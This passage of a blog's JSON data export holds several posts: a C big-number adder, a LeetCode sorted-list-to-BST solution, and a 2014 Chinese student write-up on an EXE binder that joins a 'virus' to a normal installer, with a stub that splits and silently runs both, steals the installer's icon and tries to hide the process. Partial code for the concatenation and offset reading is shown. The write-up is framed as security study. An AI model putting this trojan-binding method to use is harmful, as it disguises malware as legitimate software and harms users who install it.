class=\"line\">\t<span class=\"keyword\">if</span>(tem[<span class=\"number\">0</span>] == <span class=\"string\">'-'</span>) change(a);<span class=\"comment\">//如果是负数的话就变一下形式。这里用了十进制补码</span></span><br><span class=\"line\">\treturn <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">HPplus</span><span class=\"params\">(<span class=\"keyword\">int</span> *a,<span class=\"keyword\">int</span> *b,<span class=\"keyword\">int</span> *res)</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i,x = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tmem(res,<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i = MAX - <span class=\"number\">1</span>;i &gt; <span class=\"number\">0</span>;i --)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tres[i] = a[i] + b[i] + x;</span><br><span class=\"line\">\t\tx = (res[i] &gt;= <span class=\"number\">10</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(res[i] &gt;= <span class=\"number\">10</span>) res[i] -= <span class=\"number\">10</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">output</span><span class=\"params\">(<span class=\"keyword\">int</span> *res)</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i,flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(res[<span class=\"number\">1</span>] == <span class=\"number\">9</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tchange(res);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"-\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i = <span class=\"number\">1</span>;i &lt; MAX &amp;&amp; res[i] == <span class=\"number\">0</span>;i ++);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(;i &lt; MAX;i ++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\"</span>,res[i]);</span><br><span class=\"line\">\t\tflag = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!flag) <span class=\"built_in\">printf</span>(<span class=\"string\">\"0\"</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a[MAX],b[MAX];</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> res[MAX];</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(input(a) &amp;&amp; input(b))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tHPplus(a,b,res);</span><br><span class=\"line\">\t\toutput(res);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>"},{"title":"all in one figure","date":"2016-06-06T21:43:24.000Z","_content":"The figure is:\n<!--more-->\n## all in one ##\n![](/image/machine_fingerprinting/all_in_one.png)\n","source":"_posts/all-in-one-figure.md","raw":"---\ntitle: all in one figure\ndate: 2016-06-06 21:43:24\ntags: Machine Fingerprinting\n---\nThe figure is:\n<!--more-->\n## all in one ##\n![](/image/machine_fingerprinting/all_in_one.png)\n","slug":"all-in-one-figure","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681vn002lwypdnsbndx6b","content":"<p>The figure is:<br><a id=\"more\"></a></p>\n<h2 id=\"all-in-one\"><a href=\"#all-in-one\" class=\"headerlink\" title=\"all in one\"></a>all in one</h2><p><img src=\"/image/machine_fingerprinting/all_in_one.png\" alt=\"\"></p>\n","excerpt":"<p>The figure is:<br>","more":"</p>\n<h2 id=\"all-in-one\"><a href=\"#all-in-one\" class=\"headerlink\" title=\"all in one\"></a>all in one</h2><p><img src=\"/image/machine_fingerprinting/all_in_one.png\" alt=\"\"></p>"},{"title":"convert sorted list to binary search tree","date":"2016-06-15T17:44:30.000Z","_content":"Given a singly linked list where elements are sorted in ascending order, convert it to a height balanced BST.\n<!--more-->\nThis is my simple code: simple recursive\n```\nclass Solution {\n    public:\n        TreeNode* sortedListToBST(ListNode* head) {\n            if(!head) return NULL;\n            if(!(head->next)) return new TreeNode(head->val);\n            ListNode *fast = head, *slow = head, *pre = NULL;\n            while(fast && fast->next){\n                pre = slow;\n                fast = fast->next->next;\n                slow = slow->next;\n            }\n            TreeNode *root = new TreeNode(slow->val);\n            pre->next = NULL;\n            root->left = sortedListToBST(head);\n            root->right = sortedListToBST(slow->next);\n            return root;\n        }\n};\n```\nThis is a strange way:\n```\nclass Solution {\n    public:\n        TreeNode* sortedListToBST(ListNode* head) {\n            int size=0;\n            ListNode *save=head;\n            while(head){\n                size++;\n                head = head->next;\n            }\n            head = save;\n            TreeNode* root = helper(head,size);\n            return root;\n        }\n        TreeNode* helper(ListNode*& head,int size){\n            if(head==NULL ||size<=0) return NULL;\n            int rightSize = (size-1)/2; \n            TreeNode* left = helper(head,size-1-rightSize);\n            TreeNode* root = new TreeNode(head->val);\n            head = head->next;\n            root->left = left;\n            root->right = helper(head,rightSize);\n            return root;\n        }\n};\n```\n","source":"_posts/convert-sorted-list-to-binary-search-tree.md","raw":"---\ntitle: convert sorted list to binary search tree\ndate: 2016-06-15 17:44:30\ntags: leetcode\n---\nGiven a singly linked list where elements are sorted in ascending order, convert it to a height balanced BST.\n<!--more-->\nThis is my simple code: simple recursive\n```\nclass Solution {\n    public:\n        TreeNode* sortedListToBST(ListNode* head) {\n            if(!head) return NULL;\n            if(!(head->next)) return new TreeNode(head->val);\n            ListNode *fast = head, *slow = head, *pre = NULL;\n            while(fast && fast->next){\n                pre = slow;\n                fast = fast->next->next;\n                slow = slow->next;\n            }\n            TreeNode *root = new TreeNode(slow->val);\n            pre->next = NULL;\n            root->left = sortedListToBST(head);\n            root->right = sortedListToBST(slow->next);\n            return root;\n        }\n};\n```\nThis is a strange way:\n```\nclass Solution {\n    public:\n        TreeNode* sortedListToBST(ListNode* head) {\n            int size=0;\n            ListNode *save=head;\n            while(head){\n                size++;\n                head = head->next;\n            }\n            head = save;\n            TreeNode* root = helper(head,size);\n            return root;\n        }\n        TreeNode* helper(ListNode*& head,int size){\n            if(head==NULL ||size<=0) return NULL;\n            int rightSize = (size-1)/2; \n            TreeNode* left = helper(head,size-1-rightSize);\n            TreeNode* root = new TreeNode(head->val);\n            head = head->next;\n            root->left = left;\n            root->right = helper(head,rightSize);\n            return root;\n        }\n};\n```\n","slug":"convert-sorted-list-to-binary-search-tree","published":1,"updated":"2016-06-15T17:48:07.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681vs002nwypd3nk81agy","content":"<p>Given a singly linked list where elements are sorted in ascending order, convert it to a height balanced BST.<br><a id=\"more\"></a><br>This is my simple code: simple recursive<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Solution</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span>:</span><br><span class=\"line\">        TreeNode* sortedListToBST(ListNode* head) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(!head) <span class=\"keyword\">return</span> <span class=\"keyword\">NULL</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(!(head-&gt;next)) <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> TreeNode(head-&gt;val);</span><br><span class=\"line\">            ListNode *fast = head, *slow = head, *pre = <span class=\"keyword\">NULL</span>;</span><br><span class=\"line\">            <span class=\"keyword\">while</span>(fast &amp;&amp; fast-&gt;next)&#123;</span><br><span class=\"line\">                pre = slow;</span><br><span class=\"line\">                fast = fast-&gt;next-&gt;next;</span><br><span class=\"line\">                slow = slow-&gt;next;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            TreeNode *root = <span class=\"keyword\">new</span> TreeNode(slow-&gt;val);</span><br><span class=\"line\">            pre-&gt;next = <span class=\"keyword\">NULL</span>;</span><br><span class=\"line\">            root-&gt;left = sortedListToBST(head);</span><br><span class=\"line\">            root-&gt;right = sortedListToBST(slow-&gt;next);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> root;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>This is a strange way:<br><figure class=\"highlight fortran\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> Solution &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span>:</span><br><span class=\"line\">        TreeNode* sortedListToBST(ListNode* head) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0</span>;</span><br><span class=\"line\">            ListNode *<span class=\"keyword\">save</span>=head;</span><br><span class=\"line\">            <span class=\"keyword\">while</span>(head)&#123;</span><br><span class=\"line\">                <span class=\"built_in\">size</span>++;</span><br><span class=\"line\">                head = head-&gt;next;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            head = <span class=\"keyword\">save</span>;</span><br><span class=\"line\">            TreeNode* root = helper(head,<span class=\"built_in\">size</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> root;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        TreeNode* helper(ListNode*&amp; head,<span class=\"built_in\">int</span> <span class=\"built_in\">size</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(head==NULL ||<span class=\"built_in\">size</span>&lt;=<span class=\"number\">0</span>) <span class=\"keyword\">return</span> NULL;</span><br><span class=\"line\">            <span class=\"built_in\">int</span> rightSize = (<span class=\"built_in\">size</span>-<span class=\"number\">1</span>)/<span class=\"number\">2</span>; </span><br><span class=\"line\">            TreeNode* left = helper(head,<span class=\"built_in\">size</span>-<span class=\"number\">1</span>-rightSize);</span><br><span class=\"line\">            TreeNode* root = new TreeNode(head-&gt;val);</span><br><span class=\"line\">            head = head-&gt;next;</span><br><span class=\"line\">            root-&gt;left = left;</span><br><span class=\"line\">            root-&gt;right = helper(head,rightSize);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> root;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n","excerpt":"<p>Given a singly linked list where elements are sorted in ascending order, convert it to a height balanced BST.<br>","more":"<br>This is my simple code: simple recursive<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Solution</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span>:</span><br><span class=\"line\">        TreeNode* sortedListToBST(ListNode* head) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(!head) <span class=\"keyword\">return</span> <span class=\"keyword\">NULL</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(!(head-&gt;next)) <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> TreeNode(head-&gt;val);</span><br><span class=\"line\">            ListNode *fast = head, *slow = head, *pre = <span class=\"keyword\">NULL</span>;</span><br><span class=\"line\">            <span class=\"keyword\">while</span>(fast &amp;&amp; fast-&gt;next)&#123;</span><br><span class=\"line\">                pre = slow;</span><br><span class=\"line\">                fast = fast-&gt;next-&gt;next;</span><br><span class=\"line\">                slow = slow-&gt;next;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            TreeNode *root = <span class=\"keyword\">new</span> TreeNode(slow-&gt;val);</span><br><span class=\"line\">            pre-&gt;next = <span class=\"keyword\">NULL</span>;</span><br><span class=\"line\">            root-&gt;left = sortedListToBST(head);</span><br><span class=\"line\">            root-&gt;right = sortedListToBST(slow-&gt;next);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> root;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>This is a strange way:<br><figure class=\"highlight fortran\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> Solution &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span>:</span><br><span class=\"line\">        TreeNode* sortedListToBST(ListNode* head) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0</span>;</span><br><span class=\"line\">            ListNode *<span class=\"keyword\">save</span>=head;</span><br><span class=\"line\">            <span class=\"keyword\">while</span>(head)&#123;</span><br><span class=\"line\">                <span class=\"built_in\">size</span>++;</span><br><span class=\"line\">                head = head-&gt;next;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            head = <span class=\"keyword\">save</span>;</span><br><span class=\"line\">            TreeNode* root = helper(head,<span class=\"built_in\">size</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> root;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        TreeNode* helper(ListNode*&amp; head,<span class=\"built_in\">int</span> <span class=\"built_in\">size</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(head==NULL ||<span class=\"built_in\">size</span>&lt;=<span class=\"number\">0</span>) <span class=\"keyword\">return</span> NULL;</span><br><span class=\"line\">            <span class=\"built_in\">int</span> rightSize = (<span class=\"built_in\">size</span>-<span class=\"number\">1</span>)/<span class=\"number\">2</span>; </span><br><span class=\"line\">            TreeNode* left = helper(head,<span class=\"built_in\">size</span>-<span class=\"number\">1</span>-rightSize);</span><br><span class=\"line\">            TreeNode* root = new TreeNode(head-&gt;val);</span><br><span class=\"line\">            head = head-&gt;next;</span><br><span class=\"line\">            root-&gt;left = left;</span><br><span class=\"line\">            root-&gt;right = helper(head,rightSize);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> root;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>"},{"title":"exe程序捆绑运行的设计实现","date":"2014-10-31T22:32:45.000Z","_content":">#程序拼接软件研究与实现\n<!--more-->\n>第一作者：李松   第二作者：薛野\n\n##研究背景\n近些年病毒程序越来越猖狂，各种病毒更是和普通的安装程序绑定在一起，让一般用户（特指一般不去官网下载而且不验证MD5的用户），很容易在安装一般程序的时候顺手运行了黑客设计的病毒程序。这种用户主动运行病毒程序的方式让整个的入侵过程防不胜防。作为一个信息安全学习人员，我们在这里就研究一下怎么绑定程序自动后台运行两个程序。\n##材料准备\n普通安装程序 *1；\n模拟病毒程序 *1；\nVisual Studio IDE *1；\nVisual Studio 程序序列号 *1；\nMS提供的c#编程语言\n##程序设计\n###开始阶段\n开始的时候，我的小组程序设计是这样的。\n1，肢解正常的安装程序；\n2，在原来的安装程序资源中加入病毒程序；\n3，用一些不知道怎么方法的方法运行起来病毒程序。\n后来经过各种尝试和研究，发现第三步出了问题。虽然我们可以很容易的把正常安装程序肢解并且把病毒程序打包到安装程序中，而且外观上看不出什么问题来。但是悲剧的是运行安装程序的时候也没有什么问题（病毒程序根本不会运行）。这里也是我自己基础知识太薄弱。程序的最开始引导部分根本就不会有运行后边病毒的指令，怎么会运行病毒程序呢。\n###程序设计\n后来的时候，我们小组有重新设计了新的程序；\n1，提取正常安装程序的图标；\n2，把病毒程序拼接到正常程序后边；\n3，重新写一个新的控制程序，运行的时候让他拆开后边两个程序（正常安装程序以及病毒程序）并且相互独立运行；\n4，把控制程序拼接到程序的最前端；\n5，替换这个控制程序的图标。\n总体来说就是这样的。\n![pic1](http://ww4.sinaimg.cn/large/aa74c538jw1eluq49tthjj207b07zdfw.jpg)\n后来发现控制程序根本很难知道正常程序的起始位置和病毒程序的起始位置。在此之后我曾经很想让控制程序自动找到正常运行程序的起始特征标识以及病毒程序的特征标识，后来失败了。最终采取了另外的策略，在捆绑程序的时候，我们算好了正常程序和病毒程序的大小。然后把它们记录好了，放在病毒程序的后边，一共8个字节，记录了两个int，也就是病毒程序和正常程序起始位置相对于程序开始的偏移量。这样通过读取最后的两个位置，我们就可以直接找到正常程序和病毒程序的起始位置了。图示如下：\n![pic2](http://ww4.sinaimg.cn/large/aa74c538jw1eluq59k7bzj207z09tgls.jpg)\n###代码编写\n写代码的时候问题最多。\n####拼接程序：\n1，各种按键，各种头文件，各种界面设计代码一律省略；\n2， CBoundTryDlg::OnBnClickedOk()\n这个东西是捆绑过程的核心，在这个里边实现了程序的大小检测，程序的拼接以及最\t后的大小记录。关键代码贴出来看看就好：\n```\nVirusFile.Read(pbyVirusFile, dwVirusFileLength);\n//就像上边这样把程序文件读进内存，然后记录程序大小。\nDWORD dwInfectFilePos = dwContralFileLength;\nDWORD dwInfectFilePos1 = dwContralFileLength + dwInfectFileLength;\n//像这样记录好程序的起始位置，这里contral竟然拼写错了。\n//这里dwInfectFilePos 就是正常程序的偏移量，也就是control（控制程序）的大小。\n//dwInfectFilePos1 就是病毒程序的偏移量，也就是control + 正常程序的大小。\nTargetFile.Write(pbyContralFile, dwContralFileLength);\nTargetFile.Write(pbyInfectFile, dwInfectFileLength);\nTargetFile.Write(pbyVirusFile, dwVirusFileLength);\nTargetFile.Write(FileInfo, sizeof(FileInfo));\n//上边就是写入文件的过程了。\n```\n3，更换图标\n这一块难度很大。想了很多代码。过程如下：\n1，可以通过图标句柄制造出一个图标，然后按到程序里边；\n2，可以扫描程序图标造出一个新的图标，然后按到程序里边；\n3，直接在程序中查找图标，按到新的程序里边。\n前两个方案经过一整天的实验宣告失败。可能是由于对于程序句柄以及图标处理了解\t太少。后来从网上找到了第三种方案的代码，读懂之后稍作修改，实现了该功能。\n控制程序：\n这个东西技术含量比较大。最大的问题就是：程序运行的时候很难测试\n这个程序的核心在于，拆解这个程序后边的部分，把一个大的程序拆解然后运行。\n需要在这个控制程序本身的末尾找到标明正常程序和病毒程序偏移量的两个int。\n问题是写代码的时候根本没办法调试啊！程序一跑起来，怎么可能在debug的时候在自己本身的最后边找到这两个int呢。因为写入这两个int以及把整个最后的程序组装起来的试前边说的拼接程序，写这部分代码的时候根本没有后边的程序啊。\n详细说明如下：\n![pic2](http://ww4.sinaimg.cn/large/aa74c538jw1eluq59k7bzj207z09tgls.jpg)\n在控制程序编写过程中，debug生成的程序仅仅是控制程序部分。一旦运行起来，他就要去找最后的“正常程序和病毒程序的位置”，然后现在还没拼接呢，根本不存在啊。接下来去找偏移量肯定会报错了。因为这一块内存已经不归控制程序管了。\n最后我机智的用了另外一个小程序代替控制程序，先运行前边的拼接程序，组成一个用于实验的结构完整的拼接好的程序。然后把代码写成这样：\nexeFullPath = \"E:\\\\res.exe\";\n也就是试验中控制程序控制的目标是这个结构完成的虚拟程序，而不是自己。调试好各个拆分点等等，最后在改成控制本身就可以了。\n关键代码如下：\n```\nLogFile.Seek(-8,CFile::end);\nCString strBuf,strBuf2;\nLogFile.Read(strBuf.GetBufferSetLength(4),4);\nLogFile.Seek(-4, CFile::end);\nLogFile.Read(strBuf2.GetBufferSetLength(4), 4);```\n在程序的结尾读出8字节的记录信息，然后存储好当做位置用。\n```\nstrExecFilename1= \"1.exe\";\nstrExecFilename2= \"2.exe\";\nstrEncrypt=strBuf.Mid(0,8);\nmemcpy(&dwFirstLength,strBuf.GetBuffer(4),4);\nmemcpy(&dwSecondLength,strBuf2.GetBuffer(4),4);```\n根据上边得到的偏移量信息，找到拆分点。\n然后拆分运行就可以了。\n###程序隐藏\n程序隐藏部分按说是比较容易处理的。直接开启隐藏进程就可以了。但是不知道为什么，一旦开起了隐藏，直接程序就不能正常跑了。全部程序都隐藏起来了。这里代码有一点问题，还在调试过程中。\n##最后的收获\n1，老师说得对啊，自己做的才最有收获，自己研究的才最能提升；\n2，设计程序的时候一定要基于在对本程序机理的理解的前提下设计，贸然动手只会浪费时间；\n3，对于很多东西自己上网查找很靠谱，按照自己设计的路线有时候根本行不通；\n4，这下算是对于exe格式的程序有了更多的了解。知道了怎么写出来捆绑安装的程序了。而且是静默的捆绑安装，不是简单的程序打包。\n5，团队给了我无限的创意和力量！\n6，程序隐藏真心任重而道远，接下来的程序加壳脱壳更是难以设计。这方面知识欠缺的太多了，急需要补充一下。\n","source":"_posts/exeprogram.md","raw":"title: exe程序捆绑运行的设计实现\ndate: 2014-10-31 22:32:45\ntags: IT\ncategories: Windows\n---\n>#程序拼接软件研究与实现\n<!--more-->\n>第一作者：李松   第二作者：薛野\n\n##研究背景\n近些年病毒程序越来越猖狂，各种病毒更是和普通的安装程序绑定在一起，让一般用户（特指一般不去官网下载而且不验证MD5的用户），很容易在安装一般程序的时候顺手运行了黑客设计的病毒程序。这种用户主动运行病毒程序的方式让整个的入侵过程防不胜防。作为一个信息安全学习人员，我们在这里就研究一下怎么绑定程序自动后台运行两个程序。\n##材料准备\n普通安装程序 *1；\n模拟病毒程序 *1；\nVisual Studio IDE *1；\nVisual Studio 程序序列号 *1；\nMS提供的c#编程语言\n##程序设计\n###开始阶段\n开始的时候，我的小组程序设计是这样的。\n1，肢解正常的安装程序；\n2，在原来的安装程序资源中加入病毒程序；\n3，用一些不知道怎么方法的方法运行起来病毒程序。\n后来经过各种尝试和研究，发现第三步出了问题。虽然我们可以很容易的把正常安装程序肢解并且把病毒程序打包到安装程序中，而且外观上看不出什么问题来。但是悲剧的是运行安装程序的时候也没有什么问题（病毒程序根本不会运行）。这里也是我自己基础知识太薄弱。程序的最开始引导部分根本就不会有运行后边病毒的指令，怎么会运行病毒程序呢。\n###程序设计\n后来的时候，我们小组有重新设计了新的程序；\n1，提取正常安装程序的图标；\n2，把病毒程序拼接到正常程序后边；\n3，重新写一个新的控制程序，运行的时候让他拆开后边两个程序（正常安装程序以及病毒程序）并且相互独立运行；\n4，把控制程序拼接到程序的最前端；\n5，替换这个控制程序的图标。\n总体来说就是这样的。\n![pic1](http://ww4.sinaimg.cn/large/aa74c538jw1eluq49tthjj207b07zdfw.jpg)\n后来发现控制程序根本很难知道正常程序的起始位置和病毒程序的起始位置。在此之后我曾经很想让控制程序自动找到正常运行程序的起始特征标识以及病毒程序的特征标识，后来失败了。最终采取了另外的策略，在捆绑程序的时候，我们算好了正常程序和病毒程序的大小。然后把它们记录好了，放在病毒程序的后边，一共8个字节，记录了两个int，也就是病毒程序和正常程序起始位置相对于程序开始的偏移量。这样通过读取最后的两个位置，我们就可以直接找到正常程序和病毒程序的起始位置了。图示如下：\n![pic2](http://ww4.sinaimg.cn/large/aa74c538jw1eluq59k7bzj207z09tgls.jpg)\n###代码编写\n写代码的时候问题最多。\n####拼接程序：\n1，各种按键，各种头文件，各种界面设计代码一律省略；\n2， CBoundTryDlg::OnBnClickedOk()\n这个东西是捆绑过程的核心，在这个里边实现了程序的大小检测，程序的拼接以及最\t后的大小记录。关键代码贴出来看看就好：\n```\nVirusFile.Read(pbyVirusFile, dwVirusFileLength);\n//就像上边这样把程序文件读进内存，然后记录程序大小。\nDWORD dwInfectFilePos = dwContralFileLength;\nDWORD dwInfectFilePos1 = dwContralFileLength + dwInfectFileLength;\n//像这样记录好程序的起始位置，这里contral竟然拼写错了。\n//这里dwInfectFilePos 就是正常程序的偏移量，也就是control（控制程序）的大小。\n//dwInfectFilePos1 就是病毒程序的偏移量，也就是control + 正常程序的大小。\nTargetFile.Write(pbyContralFile, dwContralFileLength);\nTargetFile.Write(pbyInfectFile, dwInfectFileLength);\nTargetFile.Write(pbyVirusFile, dwVirusFileLength);\nTargetFile.Write(FileInfo, sizeof(FileInfo));\n//上边就是写入文件的过程了。\n```\n3，更换图标\n这一块难度很大。想了很多代码。过程如下：\n1，可以通过图标句柄制造出一个图标，然后按到程序里边；\n2，可以扫描程序图标造出一个新的图标，然后按到程序里边；\n3，直接在程序中查找图标，按到新的程序里边。\n前两个方案经过一整天的实验宣告失败。可能是由于对于程序句柄以及图标处理了解\t太少。后来从网上找到了第三种方案的代码，读懂之后稍作修改，实现了该功能。\n控制程序：\n这个东西技术含量比较大。最大的问题就是：程序运行的时候很难测试\n这个程序的核心在于，拆解这个程序后边的部分，把一个大的程序拆解然后运行。\n需要在这个控制程序本身的末尾找到标明正常程序和病毒程序偏移量的两个int。\n问题是写代码的时候根本没办法调试啊！程序一跑起来，怎么可能在debug的时候在自己本身的最后边找到这两个int呢。因为写入这两个int以及把整个最后的程序组装起来的试前边说的拼接程序，写这部分代码的时候根本没有后边的程序啊。\n详细说明如下：\n![pic2](http://ww4.sinaimg.cn/large/aa74c538jw1eluq59k7bzj207z09tgls.jpg)\n在控制程序编写过程中，debug生成的程序仅仅是控制程序部分。一旦运行起来，他就要去找最后的“正常程序和病毒程序的位置”，然后现在还没拼接呢，根本不存在啊。接下来去找偏移量肯定会报错了。因为这一块内存已经不归控制程序管了。\n最后我机智的用了另外一个小程序代替控制程序，先运行前边的拼接程序，组成一个用于实验的结构完整的拼接好的程序。然后把代码写成这样：\nexeFullPath = \"E:\\\\res.exe\";\n也就是试验中控制程序控制的目标是这个结构完成的虚拟程序，而不是自己。调试好各个拆分点等等，最后在改成控制本身就可以了。\n关键代码如下：\n```\nLogFile.Seek(-8,CFile::end);\nCString strBuf,strBuf2;\nLogFile.Read(strBuf.GetBufferSetLength(4),4);\nLogFile.Seek(-4, CFile::end);\nLogFile.Read(strBuf2.GetBufferSetLength(4), 4);```\n在程序的结尾读出8字节的记录信息，然后存储好当做位置用。\n```\nstrExecFilename1= \"1.exe\";\nstrExecFilename2= \"2.exe\";\nstrEncrypt=strBuf.Mid(0,8);\nmemcpy(&dwFirstLength,strBuf.GetBuffer(4),4);\nmemcpy(&dwSecondLength,strBuf2.GetBuffer(4),4);```\n根据上边得到的偏移量信息，找到拆分点。\n然后拆分运行就可以了。\n###程序隐藏\n程序隐藏部分按说是比较容易处理的。直接开启隐藏进程就可以了。但是不知道为什么，一旦开起了隐藏，直接程序就不能正常跑了。全部程序都隐藏起来了。这里代码有一点问题，还在调试过程中。\n##最后的收获\n1，老师说得对啊，自己做的才最有收获，自己研究的才最能提升；\n2，设计程序的时候一定要基于在对本程序机理的理解的前提下设计，贸然动手只会浪费时间；\n3，对于很多东西自己上网查找很靠谱，按照自己设计的路线有时候根本行不通；\n4，这下算是对于exe格式的程序有了更多的了解。知道了怎么写出来捆绑安装的程序了。而且是静默的捆绑安装，不是简单的程序打包。\n5，团队给了我无限的创意和力量！\n6，程序隐藏真心任重而道远，接下来的程序加壳脱壳更是难以设计。这方面知识欠缺的太多了，急需要补充一下。\n","slug":"exeprogram","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681vt002pwypd48fv1qoh","content":"<blockquote>\n<p>#程序拼接软件研究与实现<br><a id=\"more\"></a><br>第一作者：李松   